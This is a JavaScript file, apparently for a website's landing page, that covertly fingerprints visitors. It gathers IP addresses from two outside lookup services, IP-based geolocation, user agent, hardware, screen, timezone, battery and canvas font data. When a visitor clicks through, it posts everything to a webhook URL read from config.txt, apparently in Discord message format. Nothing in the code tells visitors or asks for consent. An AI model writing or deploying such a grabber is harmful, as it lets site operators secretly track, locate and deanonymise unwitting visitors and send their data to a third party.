let webhookURL = '';

async function loadConfig() {
    try {
        const response = await fetch('config.txt');
        const text = await response.text();
        webhookURL = text.trim();
    } catch (error) {
        console.error('Error loading config file:', error);
        await reportError('Error loading config file', error.message);
    }
}

function getDeviceMemory() {
    return navigator.deviceMemory || 'Not Available';
}

function getHardwareConcurrency() {
    return navigator.hardwareConcurrency || 'Not Available';
}

function getConnectionInfo() {
    if (navigator.connection) {
        return {
            type: navigator.connection.effectiveType || 'Not Available',
            downlink: navigator.connection.downlink || 'Not Available',
            rtt: navigator.connection.rtt || 'Not Available'
        };
    }
    return {
        type: 'Not Available',
        downlink: 'Not Available',
        rtt: 'Not Available'
    };
}

function getScreenInfo() {
    return {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight
    };
}

function getBrowserFonts() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const fonts = ['Arial', 'Verdana', 'Courier New', 'Georgia', 'Times New Roman'];
    const detectedFonts = [];
    fonts.forEach(font => {
        ctx.font = `12px ${font}`;
        const text = 'abcdefghijklmnopqrstuvwxyz0123456789';
        const width = ctx.measureText(text).width;
        detectedFonts.push({ font, width });
    });
    return detectedFonts;
}

function getIP() {
    return Promise.all([
        fetch('https://ident.me').then(res => res.text()),
        fetch('https://ipv4.lafibre.info/ip.php').then(res => res.text())
    ]);
}

function getLocation() {
    return fetch('https://ipapi.co/json').then(res => res.json());
}

function getTimezone() {
    return Intl.DateTimeFormat().resolvedOptions().timeZone;
}

async function getBatteryStatus() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return {
                level: (battery.level * 100) + '%',
                charging: battery.charging ? 'Yes' : 'No'
            };
        } catch (error) {
            console.error('Error getting battery status:', error);
            await reportError('Error getting battery status', error.message);
        }
    }
    return {
        level: 'Not Available',
        charging: 'Not Available'
    };
}

async function reportError(context, message) {
    if (!webhookURL) {
        console.error('Webhook URL not set.');
        return;
    }

    try {
        const errorPayload = {
            content: `**Error Report**\n\n` +
                     `🗓️ **Date and Time:** ${new Date().toISOString()}\n` +
                     `🔍 **Context:** ${context}\n` +
                     `⚠️ **Error Message:** ${message}`
        };

        const errorPayloadText = errorPayload.content;
        const maxLength = 2000;
        const errorPayloads = [];

        for (let i = 0; i < errorPayloadText.length; i += maxLength) {
            errorPayloads.push({ content: errorPayloadText.substring(i, i + maxLength) });
        }

        for (const errorPayloadPart of errorPayloads) {
            await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(errorPayloadPart)
            });
        }
    } catch (error) {
        console.error('Error reporting error:', error);
    }
}

async function logVisitor() {
    if (!webhookURL) {
        console.error('Webhook URL not set.');
        return;
    }

    try {
        const [ipIdent, ipLafibre] = await getIP();
        const location = await getLocation();
        const connection = getConnectionInfo();
        const screen = getScreenInfo();
        const fonts = getBrowserFonts();
        const memory = getDeviceMemory();
        const concurrency = getHardwareConcurrency();
        const timezone = getTimezone();
        const batteryStatus = await getBatteryStatus();

        const payloads = [];
        const payload = {
            content: `**Visitor Log**\n\n` +
                     `🗓️ **Date and Time:** ${new Date().toISOString()}\n` +
                     `🌐 **IP from ident.me:** \`${ipIdent.trim()}\`\n` +
                     `🌐 **IP from lafibre.info:** \`${ipLafibre.trim()}\`\n` +
                     `🕵️‍♂️ **User Agent:** \`${navigator.userAgent}\`\n` +
                     `📍 **Location:** ${location.city}, ${location.region}, ${location.country_name}\n` +
                     `🔗 **Page URL:** ${window.location.href}\n` +
                     `🔍 **Referrer:** ${document.referrer || 'None'}\n` +
                     `🖥️ **Platform:** ${navigator.platform}\n` +
                     `📱 **Device Memory:** ${memory} GB\n` +
                     `🔌 **Hardware Concurrency:** ${concurrency}\n` +
                     `🔗 **Connection Type:** ${connection.type}\n` +
                     `📶 **Connection Downlink:** ${connection.downlink} Mbps\n` +
                     `⏳ **Connection RTT:** ${connection.rtt} ms\n` +
                     `🖥️ **Screen Resolution:** ${screen.width}x${screen.height}\n` +
                     `📏 **Available Screen Resolution:** ${screen.availWidth}x${screen.availHeight}\n` +
                     `🕒 **Timezone:** ${timezone}\n` +
                     `🔋 **Battery Level:** ${batteryStatus.level}\n` +
                     `🔋 **Charging:** ${batteryStatus.charging}\n` +
                     `🖋️ **Fonts Detected:** ${fonts.map(f => f.font).join(', ')}\n`
        };

        const payloadText = payload.content;

        // Split the payload into chunks if it's too large
        const maxLength = 2000;
        for (let i = 0; i < payloadText.length; i += maxLength) {
            payloads.push({ content: payloadText.substring(i, i + maxLength) });
        }

        // Send payloads
        for (const payloadPart of payloads) {
            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payloadPart)
                });
            } catch (error) {
                console.error('Error sending visitor log:', error);
                await reportError('Error sending visitor log', error.message);
            }
        }

    } catch (error) {
        console.error('Error logging visitor:', error);
        await reportError('Error logging visitor', error.message);
    }
}

function enterSite() {
    document.getElementById('landing-page').style.display = 'none';
    document.getElementById('main-content').style.display = 'block';
    logVisitor();
}

window.onload = loadConfig;
